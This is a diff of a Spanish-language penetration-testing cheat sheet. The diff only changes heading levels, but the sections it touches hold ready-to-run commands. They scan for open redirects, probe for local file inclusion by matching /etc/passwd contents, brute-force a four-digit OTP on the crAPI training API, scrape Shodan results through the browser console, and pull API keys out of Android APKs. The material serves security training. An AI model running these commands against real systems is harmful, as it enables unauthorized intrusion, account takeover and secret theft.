@@ -72,22 +72,22 @@
    - ```bash 
       cat allurls.txt | gf redirect | openredirex -p /home/paulportanc/openRedirect
       ```
-#### 1.16. HTTPX. 
+### 1.16. HTTPX. 
    - Utilizar **Httpx** para encontrar **LFI**. Este comando que le mostrará todas las urls vulnerables lfi en la pantalla, básicamente etc/passwd archivo de contraseña en la respuesta y mostrar todas las urls en la pantalla.
    - ```bash
       echo 'https://ejemplo.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\|\$[^\:]):0:0:"
       ```
-#### 1.17. WFUZZ. 
+### 1.17. WFUZZ. 
    - Utilizar **wfuzz** para fuerza bruta.
    - ```bash
       wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
       ```
-#### 1.18. SHODAN. 
+### 1.18. SHODAN. 
    - Obtener todas las IPs de Shodan sin ninguna cuenta premium. Una vez estando en Shodan en Facet Analysis, precionar F12 e ir a Console y escribir: **allow pasting**. Copiar el siguiente código
    - ```bash
       var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
       ```
-#### 1.19. APIs. 
+### 1.19. APIs. 
    - Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles. Descarga el .apk usando APKCombo o APKPure. Escaneo de archivos APK en busca de URI, puntos finales y secrets. Validar API KEY encontrada con nuclei
    - ```bash
       apkleaks -f com.EJEMPLO.COM.apk -o output_endpoints_apikeys
